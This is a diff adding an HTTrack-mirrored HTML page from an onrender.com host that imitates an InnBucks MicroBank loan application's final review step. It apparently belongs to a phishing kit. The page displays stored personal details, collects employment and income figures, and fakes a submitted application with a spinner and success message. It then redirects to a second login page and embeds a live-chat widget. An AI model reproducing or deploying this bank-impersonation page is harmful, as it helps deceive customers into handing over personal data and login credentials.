@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from innbucks2026loan.onrender.com/summary by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Feb 2026 12:54:31 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>InnBucks – Final Review</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: #f8f9fa;
+            color: #1a1a1a;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        header {
+            background: #13294B;
+            color: white;
+            padding: 1.2rem 5%;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.12);
+        }
+        .header-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .back-btn {
+            font-size: 2rem;
+            background: none;
+            border: none;
+            color: white;
+            cursor: pointer;
+            padding: 0 0.5rem;
+        }
+        .logo {
+            font-size: 2rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        .logo-inn { color: #BB2D3B; }
+        .logo-bucks { color: white; }
+
+        main {
+            flex: 1;
+            padding: 2rem 5% 3rem;
+            max-width: 620px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        .form-card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.08);
+            padding: 2.2rem 2rem;
+            border: 1px solid #e0e0e0;
+            display: flex;
+            flex-direction: column;
+            height: calc(100vh - 140px);
+        }
+        .top {
+            flex: 1;
+            overflow-y: auto;
+            padding-bottom: 2rem;
+        }
+        .form-title {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: #13294B;
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e2e8f0;
+            border-radius: 4px;
+            margin: 1.5rem auto 1rem;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 100%;
+            height: 100%;
+            background: #BB2D3B;
+            border-radius: 4px;
+        }
+        .step-text {
+            text-align: center;
+            color: #64748b;
+            font-size: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.8rem;
+        }
+        .form-label {
+            display: block;
+            font-weight: 500;
+            color: #334155;
+            margin-bottom: 0.6rem;
+            font-size: 0.95rem;
+        }
+        .form-select, .form-input {
+            width: 100%;
+            padding: 1rem 1.2rem;
+            border: 1px solid #cbd5e1;
+            border-radius: 10px;
+            font-size: 1rem;
+            background: #fff;
+            transition: all 0.2s;
+        }
+        .form-select:focus, .form-input:focus {
+            border-color: #BB2D3B;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(187,45,59,0.15);
+        }
+        .invalid {
+            border-color: #e11d48 !important;
+            box-shadow: 0 0 0 3px rgba(225,29,72,0.15) !important;
+        }
+        .field-error {
+            color: #991b1b;
+            font-size: 0.875rem;
+            margin-top: 0.4rem;
+            display: none;
+        }
+
+        .summary-box {
+            background: #fff5f5;
+            border: 1px solid #ffdede;
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+        }
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.9rem;
+            color: #475569;
+            font-size: 0.95rem;
+        }
+        .summary-row:last-child { margin-bottom: 0; }
+        .summary-value {
+            font-weight: 600;
+            color: #13294B;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+        .prev-btn, .submit-btn {
+            flex: 1;
+            padding: 1.15rem;
+            border-radius: 12px;
+            font-size: 1.15rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .prev-btn {
+            background: #e2e8f0;
+            color: #475569;
+            border: none;
+        }
+        .prev-btn:hover { background: #cbd5e1; }
+        .submit-btn {
+            background: #BB2D3B;
+            color: white;
+            border: none;
+        }
+        .submit-btn:hover {
+            background: #a02432;
+            transform: translateY(-2px);
+            box-shadow: 0 12px 28px rgba(187,45,59,0.25);
+        }
+
+        footer {
+            background: #13294B;
+            color: #ddd;
+            padding: 2rem 5% 1.5rem;
+            text-align: center;
+            font-size: 0.9rem;
+            border-top: 4px solid #BB2D3B;
+        }
+
+        /* Spinner Overlay */
+        #spinnerOverlay {
+            position: fixed; inset: 0;
+            background: rgba(19,41,75,0.7); /* navy tint */
+            display: none; justify-content: center; align-items: center;
+            z-index: 1000; flex-direction: column;
+        }
+        .spinner {
+            width: 60px; height: 60px;
+            border: 6px solid rgba(255,255,255,0.2);
+            border-top: 6px solid #BB2D3B;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 1.5rem;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Success Overlay */
+        #successOverlay {
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.6);
+            display: none; justify-content: center; align-items: center;
+            z-index: 1000;
+        }
+        .success-card {
+            background: white;
+            border-radius: 16px;
+            padding: 2.5rem 2rem;
+            width: 90%; max-width: 420px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+        }
+        .check-icon {
+            width: 80px; height: 80px;
+            background: #BB2D3B;
+            border-radius: 50%;
+            display: flex; justify-content: center; align-items: center;
+            margin: 0 auto 1.5rem;
+            font-size: 3rem; color: white;
+            font-weight: bold;
+        }
+        .success-title {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #13294B;
+            margin-bottom: 1rem;
+        }
+        .success-msg {
+            font-size: 1rem;
+            color: #475569;
+            line-height: 1.6;
+            margin-bottom: 1.8rem;
+        }
+        .redirect-bar {
+            background: #f1f5f9;
+            padding: 1rem;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            color: #64748b;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.8rem;
+        }
+        .redirect-bar .loader {
+            width: 20px; height: 20px;
+            border: 3px solid #e2e8f0;
+            border-top: 3px solid #BB2D3B;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        .go-login-btn {
+            width: 100%;
+            padding: 1.1rem;
+            background: #BB2D3B;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .go-login-btn:hover {
+            background: #a02432;
+        }
+
+        @media (min-width: 768px) {
+            .form-card { padding: 2.8rem 3.5rem; }
+            .form-title { font-size: 2rem; }
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="header-container">
+        <button class="back-btn" onclick="history.back()">←</button>
+        <div class="logo"><span class="logo-inn">Inn</span><span class="logo-bucks">Bucks</span></div>
+    </div>
+</header>
+
+<main>
+    <div class="form-card">
+        <div class="top">
+            <h1 class="form-title">Final Review</h1>
+            <div class="progress-bar"><div class="progress-fill"></div></div>
+            <div class="step-text">Step 3 of 3</div>
+
+            <div class="form-group">
+                <label class="form-label">Employment Status</label>
+                <select class="form-select" id="employmentStatus">
+                    <option>Employed</option>
+                    <option>Self-Employed</option>
+                    <option>Unemployed</option>
+                    <option>Student</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Annual Income ($)</label>
+                <input type="number" class="form-input" id="annualIncome" placeholder="50000">
+                <div class="field-error" id="incomeError">Please enter a valid annual income (minimum $1,000).</div>
+            </div>
+
+            <div class="summary-box" id="summaryBox"></div>
+        </div>
+
+        <div class="btn-group">
+            <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
+            <button class="submit-btn" id="submitBtn">SUBMIT APPLICATION</button>
+        </div>
+    </div>
+</main>
+
+<footer>
+    © 2026 InnBucks MicroBank Pvt Ltd. Licensed Deposit-Taking Microfinance Institution.<br>
+    Member of the Deposit Protection Scheme • Terms & Conditions apply • Dial *569#
+</footer>
+
+<!-- Spinner Overlay -->
+<div id="spinnerOverlay">
+    <div class="spinner"></div>
+</div>
+
+<!-- Success Overlay -->
+<div id="successOverlay">
+    <div class="success-card">
+        <div class="check-icon">✓</div>
+        <div class="success-title">Application Submitted</div>
+        <div class="success-msg">
+            Your loan application has been successfully submitted.<br><br>
+            Our team will review it shortly. You'll receive a confirmation soon.
+        </div>
+        <div class="redirect-bar">
+            <div class="loader"></div>
+            Redirecting to InnBucks login in <span id="countdown">3</span>...
+        </div>
+        <button class="go-login-btn" onclick="window.location.href='login.html'">Go to Login Now</button>
+    </div>
+</div>
+
+<script>
+    const summaryBox = document.getElementById('summaryBox');
+    summaryBox.innerHTML = `
+        <div class="summary-row"><span>Loan Type:</span><span class="summary-value">${localStorage.getItem('loanType') || 'Personal Loan'}</span></div>
+        <div class="summary-row"><span>Amount:</span><span class="summary-value">$${parseFloat(localStorage.getItem('loanAmount') || 5000).toLocaleString()}</span></div>
+        <div class="summary-row"><span>Term:</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} Months</span></div>
+        <div class="summary-row"><span>Purpose:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Not specified'}</span></div>
+        <div class="summary-row"><span>Name:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
+        <div class="summary-row"><span>Email:</span><span class="summary-value">${localStorage.getItem('email') || 'N/A'}</span></div>
+        <div class="summary-row"><span>Phone:</span><span class="summary-value">+263${localStorage.getItem('phone') || 'N/A'}</span></div>
+    `;
+
+    // Pre-fill if coming back
+    if (localStorage.getItem('employmentStatus')) {
+        document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
+    }
+    if (localStorage.getItem('annualIncome')) {
+        document.getElementById('annualIncome').value = localStorage.getItem('annualIncome');
+    }
+
+    const incomeError = document.getElementById('incomeError');
+    const spinnerOverlay = document.getElementById('spinnerOverlay');
+    const successOverlay = document.getElementById('successOverlay');
+
+    document.getElementById('submitBtn').addEventListener('click', function() {
+        const income = document.getElementById('annualIncome').value.trim();
+
+        // Reset error
+        incomeError.style.display = 'none';
+        document.getElementById('annualIncome').classList.remove('invalid');
+
+        if (!income || parseFloat(income) < 1000) {
+            document.getElementById('annualIncome').classList.add('invalid');
+            incomeError.style.display = 'block';
+            // Optional smooth scroll to error
+            document.getElementById('annualIncome').scrollIntoView({ behavior: 'smooth', block: 'center' });
+            return;
+        }
+
+        localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
+        localStorage.setItem('annualIncome', income);
+
+        // Show spinner (3 seconds)
+        spinnerOverlay.style.display = 'flex';
+
+        setTimeout(() => {
+            spinnerOverlay.style.display = 'none';
+            successOverlay.style.display = 'flex';
+
+            // Countdown redirect
+            let seconds = 3;
+            const countdownEl = document.getElementById('countdown');
+            const timer = setInterval(() => {
+                seconds--;
+                countdownEl.textContent = seconds;
+                if (seconds <= 0) {
+                    clearInterval(timer);
+                    window.location.href = 'login-2.html';
+                }
+            }, 1000);
+        }, 3000);
+    });
+</script>
+
+<!-- Tawk.to Script (unchanged) -->
+<script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+        var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+        s1.async=true;
+        s1.src='https://embed.tawk.to/6957fea3f1c6681981212604/default';
+        s1.charset='UTF-8';
+        s1.setAttribute('crossorigin','*');
+        s0.parentNode.insertBefore(s1,s0);
+    })();
+</script>
+
+</body>
+
+<!-- Mirrored from innbucks2026loan.onrender.com/summary by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Feb 2026 12:54:32 GMT -->
+</html>
